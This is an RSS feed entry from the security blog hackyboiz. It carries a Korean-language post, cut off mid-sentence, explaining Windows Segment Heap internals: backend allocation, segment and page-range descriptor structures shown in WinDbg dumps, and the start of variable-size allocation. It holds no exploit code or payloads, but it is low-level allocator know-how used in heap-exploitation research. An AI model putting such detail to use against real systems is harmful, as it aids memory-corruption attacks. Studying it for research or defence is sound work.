<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sun, 10 Oct 2021 08:25:37 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Research] Hip하게 Heap 정복하기 Part 2 - Segment Heap(2)</title>
      <link>https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/</link>
      <guid>https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/</guid>
      <pubDate>Sun, 10 Oct 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, &amp;#xBC31;&amp;#xC2E0; 2&amp;#xCC28; &amp;#xB9DE;&amp;#xACE0; &amp;#xC628; L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&amp;#x316</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, &#xBC31;&#xC2E0; 2&#xCC28; &#xB9DE;&#xACE0; &#xC628; L0ch&#xC785;&#xB2C8;&#xB2E4;&#x2026;&#x3160;&#x3160;&#x3160; </p><p><img src="/2021/10/10/l0ch/segment-heap-part2/Untitled.png" alt="Untitled"></p><p>&#xC800;&#xBC88; Part 1&#xC62C;&#xB9B4; &#xB54C;&#xB3C4; &#xB611;&#xAC19;&#xC740; &#xC774;&#xC288;&#xB85C; &#xC77C;&#xC8FC;&#xC77C; &#xBC00;&#xB838;&#xB358; &#xAC83; &#xAC19;&#xC740;&#xB370;, &#xD0C0;&#xC774;&#xBC0D;&#xC774; &#xB610;&#xB610; &#xACB9;&#xCE58;&#xAC8C; &#xB410;&#xB124;&#xC694;.. <del>&#xC0B4;&#xB824;&#xC918;</del></p><p>&#xC544;&#xBB34;&#xD2BC; 3&#xC77C; &#xC804;&#xC5D0; &#xBC31;&#xC2E0;&#xC744; &#xB9DE;&#xACE0; &#xCCAB;&#xB0A0; &#xC774;&#xD2BF;&#xB0A0;&#xAE4C;&#xC9C0; &#xAC70;&#xC758; 24&#xC2DC;&#xAC04;&#xC744; &#xB0B4;&#xB9AC; &#xC790;&#xB2E4;&#xAC00; &#xC67C;&#xCABD; &#xD314; &#xBD80;&#xC5EC;&#xC7A1;&#xC73C;&#xBA70; &#xC4F4; &#xAE00;&#xC785;&#xB2C8;&#xB2E4; &#x314E;&#x314E;; </p><p><img src="/2021/10/10/l0ch/segment-heap-part2/Untitled%201.png" alt="Untitled"></p><blockquote><p>1&#xCC28; &#xC544;&#xD504;&#xBA74; 2&#xCC28;&#xB294; &#xC548;&#xC544;&#xD504;&#xB2E4;&#xBA70;!!!! &#xB0A0; &#xC18D;&#xC600;&#xC5B4;!!!</p></blockquote><p>&#xADF8;&#xB098;&#xB9C8; &#xBC31;&#xC2E0; &#xB9DE;&#xAE30; &#xC804;&#xC5D0; &#xAC70;&#xC758; &#xB2E4; &#xC791;&#xC131;&#xD574;&#xB194;&#xC11C; &#xD391;&#xD06C;&#xB294; &#xC548; &#xB0C8;&#xB124;&#xC694; &#xD734;~!  (&#xB610; &#xD391;&#xD06C; &#xB0C8;&#xC73C;&#xBA74; &#xC55E;&#xC73C;&#xB85C; &#xD55C; &#xB2EC; &#xB3D9;&#xC548; &#xC81C; &#xAE00;&#xB9CC; &#xC62C;&#xB77C;&#xAC14;&#xC744; &#xBED4;&#xD588;&#xC9C0; &#xBB50;&#xC608;&#xC694;.. &#x2192; &#xC8FD;&#xC74C;&#xC744; &#xC758;&#xBBF8;)</p><p>&#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xD799; &#xC0DD;&#xC131;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD24;&#xC73C;&#xB2C8; &#xBC14;&#xB85C; &#xBE14;&#xB85D; &#xD560;&#xB2F9;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><h1 id="RtlpHpAllocateHeap"><a href="#RtlpHpAllocateHeap" class="headerlink" title="RtlpHpAllocateHeap()"></a>RtlpHpAllocateHeap()</h1><p><code>HeapAlloc()</code> &#xB610;&#xB294; <code>RtlAllocateHeap()</code>&#xC744; &#xD1B5;&#xD574; Heap Block&#xC744; &#xD560;&#xB2F9;&#xD560; &#xB54C; Segment Heap&#xC5D0; &#xC758;&#xD574; &#xAD00;&#xB9AC;&#xB418;&#xB294; &#xACBD;&#xC6B0; &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xC740; <code>RtlpHpAllocateHeap()</code> &#xC73C;&#xB85C; &#xB77C;&#xC6B0;&#xD305; &#xB418;&#xBA70; <code>RtlpHpAllocateHeap()</code> &#xC758; &#xD568;&#xC218; &#xC6D0;&#xD615;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">RtlpHpAllocateHeap</span><span class="hljs-params">(_SEGMENT_HEAP* HeapBase, SIZE_T UserSize, ULONG Flags, USHORT Unknown)</span></span></code></pre><p>&#xD568;&#xC218;&#xB294; AllocSize&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC801;&#xC808;&#xD55C; Segment Heap&#xC758; &#xD560;&#xB2F9; &#xAE30;&#xB2A5;&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. (&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; AllocSize&#xB294; &#xD568;&#xC218;&#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; <code>UserSize</code>&#xC774;&#xBA70; <code>UserSize</code>&#xAC00; 0&#xC778; &#xACBD;&#xC6B0; 1&#xC774; &#xB429;&#xB2C8;&#xB2E4;.)</p><p>&#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB978; &#xD560;&#xB2F9; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; <a href="https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/#%EA%B0%9C%EC%9A%94-Segment-Heap">Segment Heap &#xAC1C;&#xC694;</a> &#xC5D0;&#xC11C; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD588;&#xC5C8;&#xC8E0;? &#xB2E4;&#xC2DC; &#xB098;&#xC5F4;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><ul><li>Backend</li><li>Variable Size Allocation(VS)</li><li>Low Fragmentation Heap(LFH)</li><li>Large Blocks Allocation</li></ul><p>&#xC774; &#xC911; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; Backend&#xC640; VS&#xB97C;, &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; LFH&#xC640; Large Block&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCFC; &#xAC74;&#xB370;&#xC694;, &#xBC31;&#xC5D4;&#xB4DC;&#xBD80;&#xD130; &#xBC14;&#xB85C; &#xB118;&#xC5B4;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;!</p><h1 id="Backend-Allocation"><a href="#Backend-Allocation" class="headerlink" title="Backend Allocation"></a>Backend Allocation</h1><p>&#xBC31;&#xC5D4;&#xB4DC;&#xB294; 131,073 (0x20001, 128kb) &#xBD80;&#xD130; 520,192 (0x7F000, 508kb) &#xAE4C;&#xC9C0;&#xC758; &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC5D0;&#xB294; &#xD5E4;&#xB354;&#xAC00; &#xC5C6;&#xACE0;  &#xD398;&#xC774;&#xC9C0; &#xD06C;&#xAE30; &#xB2E8;&#xC704;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; VS/LFH&#xC758; subsegment&#xB294; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC758; &#xD2B9;&#xC218; &#xD0C0;&#xC785;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; VS&#xC640; LFH &#xBE14;&#xB85D;&#xC774; &#xD560;&#xB2F9;&#xB420; &#xB54C;&#xC5D0;&#xB3C4; &#xBC31;&#xC5D4;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Segment-Structure"><a href="#Segment-Structure" class="headerlink" title="Segment Structure"></a>Segment Structure</h2><p>&#xBC31;&#xC5D4;&#xB4DC;&#xB294; <code>NtAllocateVirtualMemory()</code> &#xB97C; &#xD1B5;&#xD574; &#xD560;&#xB2F9;&#xB41C; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; 1MB(0x100000) &#xBE14;&#xB85D;&#xC778; Segment &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xB418;&#xBA70; &#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; Segment&#xB294;  <code>_SEGMENT_HEAP</code> &#x2192; <code>SegContexts</code> &#x2192; <code>SegmentListHead</code> &#xD544;&#xB4DC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/10/l0ch/segment-heap-part2/Untitled%202.png" alt="Untitled"></p><p>&#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; &#xCCAB; 0x2000 bytes &#xAC00; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD5E4;&#xB354;&#xAC00; &#xB418;&#xACE0; &#xB098;&#xBA38;&#xC9C0;&#xB294; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D; &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xBA70; 0x2000 bytes&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xB098;&#xBA38;&#xC9C0;&#xB294; &#xC608;&#xC57D; &#xC0C1;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB2E4;&#xAC00; &#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD5E4;&#xB354;&#xC5D0;&#xB294; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; &#xAC01; &#xD398;&#xC774;&#xC9C0; &#xC0C1;&#xD0DC;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xB294; 256 bytes &#xD06C;&#xAE30;&#xC758; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xAD6C;&#xC870;&#xCCB4; &#xBC30;&#xC5F4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; &#xB370;&#xC774;&#xD130; &#xBD80;&#xBD84;&#xC774; &#xC624;&#xD504;&#xC14B; 0x2000&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCCAB; &#xBC88;&#xC9F8; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xC704;&#xCE58;&#xC5D0;&#xB294; <code>_HEAP_PAGE_SEGMENT</code> &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xB300;&#xC2E0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xB450; &#xBC88;&#xC9F8; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>&#xB294; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;..? &#xC774; &#xBD80;&#xBD84;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xBA85;&#xD655;&#xD55C; &#xC774;&#xC720;&#xB97C; &#xCC3E;&#xC744; &#xC218;&#xB294; &#xC5C6;&#xC5C8;&#xC9C0;&#xB9CC; &#xB1CC;&#xD53C;&#xC15C;&#xB85C; <code>_HEAP_PAGE_SEGMENT</code>&#xC758; &#xD06C;&#xAE30;&#xAC00; 20 bytes&#xB97C; &#xB118;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xB82C;&#xC744; &#xC704;&#xD574; &#xB0A8;&#xACA8;&#xB454; &#xACF5;&#xAC04;&#xC774;&#xC9C0; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/10/l0ch/segment-heap-part2/Untitled%203.png" alt="Untitled"></p><p>&#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xBCF4;&#xBA74; Segment&#xC758; &#xCC98;&#xC74C; &#xBD80;&#xBD84;&#xC740; <code>_HEAP_PAGE_SEGMENT</code>&#xC640; unused&#xB85C; &#xCC44;&#xC6CC;&#xC838; &#xC788;&#xACE0; 0x40&#xBD80;&#xD130; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xBC30;&#xC5F4;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;. &#xC774;&#xD6C4; 0x2000 &#xC774;&#xD6C4; &#xACF5;&#xAC04;&#xC774; &#xC2E4;&#xC81C; &#xD398;&#xC774;&#xC9C0;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>_HEAP_PAGE_SEGMENT</code> &#xC640; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xC744; &#xC880; &#xB354; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="HEAP-PAGE-SEGMENT"><a href="#HEAP-PAGE-SEGMENT" class="headerlink" title="_HEAP_PAGE_SEGMENT"></a>_HEAP_PAGE_SEGMENT</h2><p><code>_HEAP_PAGE_SEGMENT</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xD544;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">021</span>&gt; dt ntdll!_HEAP_PAGE_SEGMENT   +<span class="hljs-number">0x000</span> ListEntry        : _LIST_ENTRY   +<span class="hljs-number">0x010</span> Signature        : Uint8B   +<span class="hljs-number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE   +<span class="hljs-number">0x020</span> UnusedWatermark  : UChar   +<span class="hljs-number">0x000</span> DescArray        : [<span class="hljs-number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</code></pre><ul><li><code>ListEntry</code> : &#xAC01; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; <code>SegmentListHead</code>&#xC758; Linked List &#xB178;&#xB4DC;</li><li><code>Signature</code> : &#xC8FC;&#xC18C;&#xAC00; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; &#xC77C;&#xBD80;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB428;<ul><li><code>(&#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xC8FC;&#xC18C; &gt;&gt; 0x14) ^ RtlpHeapKey ^ HeapBase(_SEGMENT_HEAP) ^ 0xA2E64EAD2E64EAD</code> &#xB85C; &#xACC4;&#xC0B0;&#xB428;</li></ul></li></ul><h2 id="HEAP-PAGE-RANGE-DESCRIPTOR"><a href="#HEAP-PAGE-RANGE-DESCRIPTOR" class="headerlink" title="_HEAP_PAGE_RANGE_DESCRIPTOR"></a>_HEAP_PAGE_RANGE_DESCRIPTOR</h2><p> <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xB294; &#xAC01; &#xD398;&#xC774;&#xC9C0; &#xC0C1;&#xD0DC;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD544;&#xB4DC;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC740; &#xC5EC;&#xB7EC; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC758; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>&#xC5D0;&#xB3C4; &#xC774;&#xB97C; &#xC54C;&#xB9B4; &#xC218; &#xC788;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD544;&#xB4DC;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">021</span>&gt; dt ntdll!_HEAP_PAGE_RANGE_DESCRIPTOR   +<span class="hljs-number">0x000</span> TreeNode         : _RTL_BALANCED_NODE   +<span class="hljs-number">0x000</span> TreeSignature    : Uint4B   +<span class="hljs-number">0x004</span> UnusedBytes      : Uint4B   +<span class="hljs-number">0x008</span> ExtraPresent     : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x008</span> Spare0           : Pos <span class="hljs-number">1</span>, <span class="hljs-number">15</span> Bits   +<span class="hljs-number">0x018</span> RangeFlags       : UChar   +<span class="hljs-number">0x019</span> CommittedPageCount : UChar   +<span class="hljs-number">0x01a</span> Spare            : Uint2B   +<span class="hljs-number">0x01c</span> Key              : _HEAP_DESCRIPTOR_KEY+<span class="hljs-number">0x000</span> Key              : Uint4B      +<span class="hljs-number">0x000</span> EncodedCommittedPageCount : Pos <span class="hljs-number">0</span>, <span class="hljs-number">16</span> Bits      +<span class="hljs-number">0x000</span> LargePageCost    : Pos <span class="hljs-number">16</span>, <span class="hljs-number">8</span> Bits      +<span class="hljs-number">0x000</span> UnitCount        : Pos <span class="hljs-number">24</span>, <span class="hljs-number">8</span> Bits   +<span class="hljs-number">0x01c</span> Align            : [<span class="hljs-number">3</span>] UChar   +<span class="hljs-number">0x01f</span> Offset       : UChar   +<span class="hljs-number">0x01f</span> Size         : UChar</code></pre><ul><li><code>TreeNode</code> : free &#xB41C; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC784;&#xC744; &#xB098;&#xD0C0;&#xB0C4;<ul><li><code>FreePageRanges</code>&#xC758; &#xB178;&#xB4DC;</li></ul></li><li><code>UnusedBytes</code> : &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC778; &#xACBD;&#xC6B0; <code>UserSize</code>&#xC640; &#xD560;&#xB2F9;&#xB41C; &#xBE14;&#xB85D; &#xD06C;&#xAE30;&#xC758; &#xC0AC;&#xC774;&#xC988; &#xCC28;&#xC774;, &#xC989; alignment&#xB85C; &#xC778;&#xD574; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xD06C;&#xAE30;&#xB97C; &#xB098;&#xD0C0;&#xB0C4;</li><li><code>RangeFlags</code> : &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC758; &#xD0C0;&#xC785;&#xACFC; &#xD398;&#xC774;&#xC9C0; state&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBE44;&#xD2B8; &#xD544;&#xB4DC;<ul><li><code>0x01</code>: <code>PAGE_RANGE_FLAGS_LFH_SUBSEGMENT</code> &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC778; &#xACBD;&#xC6B0; LFH &#xD558;&#xC704; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC784;&#xC744; &#xB098;&#xD0C0;&#xB0C4;</li><li><code>0x02</code>: <code>PAGE_RANGE_FLAGS_COMMITED</code> &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xCEE4;&#xBC0B;&#xB428;</li><li><code>0x04</code>: <code>PAGE_RANGE_FLAGS_ALLOCATED</code> &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xAC70;&#xB098; &#xC0AC;&#xC6A9; &#xC911;&#xC784;</li><li><code>0x08</code>: <code>PAGE_RANGE_FLAGS_FIRST</code> &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC784;&#xC744; &#xD45C;&#xC2DC;</li><li><code>0x20</code>: <code>PAGE_RANGE_FLAGS_VS_SUBSEGMENT</code> &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC778; &#xACBD;&#xC6B0; VS &#xD558;&#xC704; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC784;&#xC744; &#xB098;&#xD0C0;&#xB0C4;</li></ul></li><li><code>Key</code> : free &#xB41C; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xB9CC; &#xC788;&#xC73C;&#xBA70; backend free tree&#xC5D0; free &#xB41C; &#xBE14;&#xB85D;&#xC744; &#xC0BD;&#xC785;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD568;<ul><li><code>Key</code> - backend free tree&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; WORD &#xD06C;&#xAE30;&#xC758; &#xD0A4;. &#xC0C1;&#xC704; bytes&#xB294; <code>PageCount</code> &#xD544;&#xB4DC;/&#xD558;&#xC704; bytes&#xB294; <code>EncodedCommitCount</code> &#xD544;&#xB4DC;</li><li><code>EncodedCommitCount</code> - &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC758; &#xCEE4;&#xBC0B;&#xB41C; &#xD398;&#xC774;&#xC9C0; &#xC218;&#xC5D0; &#xB300;&#xD55C; Bitwise NOT</li><li><code>UnitCount</code> : &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC758; &#xD398;&#xC774;&#xC9C0; &#xC218;</li></ul></li><li><code>Offset</code> : &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xC544;&#xB2CC; &#xACBD;&#xC6B0; &#xCCAB; &#xBC88;&#xC9F8;  <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xC5D0;&#xC11C;&#xBD80;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;</li><li><code>Size</code> : &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xC778; &#xACBD;&#xC6B0; <code>Key.PageCount</code> &#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xAC12;</li></ul><p>&#xC544;&#xB798; &#xADF8;&#xB9BC;&#xC740; 128kb(0x20100) &#xBC31;&#xC5D4;&#xB4DC; &#xD560;&#xB2F9;&#xD588;&#xC744; &#xB54C;&#xC758; Segment Heap&#xC758; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/10/l0ch/segment-heap-part2/Untitled%204.png" alt="Untitled"></p><p><code>0x00</code>&#xC5D0;&#xB294; <code>_HEAP_PAGE_SEGMENT</code>&#xAC00;, <code>0x01</code>&#xC740; unused&#xACE0; <code>0x02</code>&#xC758; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>&#xC758;  <code>RagneFlags</code>&#xC5D0; First &#xBE44;&#xD2B8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Page&#xC758; &#xB2E8;&#xC704;&#xAC00; 0x1000&#xC774;&#xBBC0;&#xB85C; 0x20100 &#xD560;&#xB2F9;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB294; #0x02&#xBD80;&#xD130; #0x22&#xAE4C;&#xC9C0; 21&#xAC1C;&#xC758; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xC918;&#xC57C; &#xD558;&#xACA0;&#xB124;&#xC694;. &#xCEE4;&#xBC0B;&#xB41C; &#xD398;&#xC774;&#xC9C0; &#xC804;&#xCCB4; &#xD06C;&#xAE30;&#xB294; 0x21000&#xC774;&#xBBC0;&#xB85C; &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC740; 0x20100&#xC744; &#xBE7C;&#xBA74; <code>UnusedBytes : 0xF00</code>&#xC774; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. </p><p>&#xCCAB; &#xBC88;&#xC9F8; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xC678;&#xC758; <code>RanageFlags</code>&#xC5D0;&#xB294; &#xC624;&#xD504;&#xC14B; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="VARIABLE-SIZE-ALLOCATION"><a href="#VARIABLE-SIZE-ALLOCATION" class="headerlink" title="VARIABLE SIZE ALLOCATION"></a>VARIABLE SIZE ALLOCATION</h1><p>&#xAC00;&#xBCC0; &#xD06C;&#xAE30;(Variable Size, VS) &#xD560;&#xB2F9;&#xC740; &#xD06C;&#xAE30;&#xAC00; 1~131,072(0x20000) bytes&#xC778; &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. VS &#xBE14;&#xB85D;&#xC740; 16 byte &#xB2E8;&#xC704;&#xB97C; &#xAC00;&#xC9C0;&#xBA70; &#xAC01;&#xAC01; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0; &#xBE14;&#xB85D; &#xD5E4;&#xB354;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="VS-Subsegments"><a href="#VS-Subsegments" class="headerlink" title="VS Subsegments"></a>VS Subsegments</h2><p>VS &#xD560;&#xB2F9; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB294; VS subsegment&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBC31;&#xC5D4;&#xB4DC;&#xC5D0; &#xC758;&#xC874;&#xD569;&#xB2C8;&#xB2E4;. VS subsegment&#xB294; &#xCCAB; &#xBC88;&#xC9F8; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xC758; <code>RangeFlags</code>&#xC5D0; <code>PAGE_RANGE_FLAGS_VS_SUBSEGMENT(0x20)</code> &#xBE44;&#xD2B8;&#xAC00; &#xC124;&#xC815;&#xB41C; &#xD2B9;&#xC218;&#xD55C; &#xD0C0;&#xC785;&#xC758; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/10/l0ch/segment-heap-part2/Untitled%205.png" alt="Untitled"></p><p>&#xADF8;&#xB9BC;&#xC744; &#xBCF4;&#xBA74; VS subsegment&#xB294; &#xBC31;&#xC5D4;&#xB4DC; &#xBE14;&#xB85D; &#xC790;&#xB9AC;&#xB97C; &#xCC28;&#xC9C0;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. VS &#xD560;&#xB2F9;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBC31;&#xC5D4;&#xB4DC; &#xD560;&#xB2F9;&#xC774; &#xBA3C;&#xC800; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;.</p><h2 id="HEAP-VS-CONTEXT"><a href="#HEAP-VS-CONTEXT" class="headerlink" title="_HEAP_VS_CONTEXT"></a>_HEAP_VS_CONTEXT</h2><p><code>_HEAP_VS_CONTEXT</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; <code>_SEGMENT_HEAP</code>&#xC758; <code>VsContext</code> &#xD544;&#xB4DC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD558;&#xBA70; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; VS &#xBE14;&#xB85D;, VS subsegment &#xBC0F; VS &#xD560;&#xB2F9; state&#xC640; &#xAD00;&#xB828;&#xB41C; 